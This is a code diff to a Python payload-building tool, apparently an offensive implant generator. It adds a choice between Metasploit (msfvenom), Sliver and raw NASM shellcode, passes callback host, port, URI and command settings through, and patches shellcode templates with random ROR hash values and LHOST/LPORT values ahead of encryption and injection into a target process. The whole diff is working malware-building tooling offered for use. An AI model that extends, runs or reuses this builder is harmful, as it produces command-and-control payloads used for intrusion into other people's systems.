@@ -16,6 +16,11 @@ config.read(".conf")
 def is_set(value):
     return value != None and value != ""
 
+FRAMEWORK = config.get("Payload", "framework")
+if FRAMEWORK != "metasploit" and FRAMEWORK != "sliver" and FRAMEWORK != "raw":
+    print("Framework must be metasploit or sliver or raw")
+    sys.exit(1)
+
 ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
 TARGET_PROCESS = config.get("Payload", "target_process")
 
@@ -49,6 +54,7 @@ def main():
     RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
     RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
     RURI = config.get("Payload", "ruri") if is_set(config.get("Payload", "ruri")) else None
+    CMD = config.get("Payload", "cmd") if is_set(config.get("Payload", "cmd")) else None
 
     if PRIORIZE_SIZE:
         # no stdlib
@@ -64,7 +70,20 @@ def main():
 
     if is_set(config.get("Payload", "name")):
         PAYLOAD_NAME = config.get("Payload", "name")
-        if ".asm" in PAYLOAD_NAME or ".nasm" in PAYLOAD_NAME:
+        PAYLOAD_FILE = "payload.txt"
+        if FRAMEWORK == "metasploit":
+            PAYLOAD_NAME = config.get("Payload", "name")
+            if PAYLOAD_NAME == "":
+                print("No payload name specified")
+                sys.exit(1)
+            msfvenom(PAYLOAD_NAME, RHOST, RPORT, RURI, CMD)
+        elif FRAMEWORK == "sliver":
+            PAYLOAD_NAME = config.get("Payload", "name")
+            if PAYLOAD_NAME == "":
+                print("No payload name specified")
+                sys.exit(1)
+            sliver(PAYLOAD_NAME, RHOST, RPORT, RURI, CMD)
+        else: #raw
             ROR_VALUE = random.choice([13,17,19,21,23])
             sed_file(WORKING_FOLDER+PAYLOAD_NAME, "%ROR_VALUE%", hex(ROR_VALUE))
             sed_file(WORKING_FOLDER+PAYLOAD_NAME, "%LHOST__LPORT%", format_lhost_lport(RHOST,RPORT))
@@ -82,10 +101,6 @@ def main():
             instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_NAME)
             with open("build/payload.txt", "w") as f:
                 f.write(str(instructions))
-        else:
- 
-            msfvenom(PAYLOAD_NAME, RHOST, RPORT, RURI)
-        PAYLOAD_FILE = "payload.txt"
     else:
         print("No payload file or payload name specified")
         sys.exit(1)
@@ -107,8 +122,6 @@ def main():
         tags = file["tags"]
         # print(f"Processing {filename} with tags {tags}")
         # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
-        if "anti" in filename:
-            print(f"Processing {filename} with tags {tags}")
         for tag in tags:
             parts = tag.replace("%", "").split("__")
             if parts[0] == "MODHASH": # definitions.c
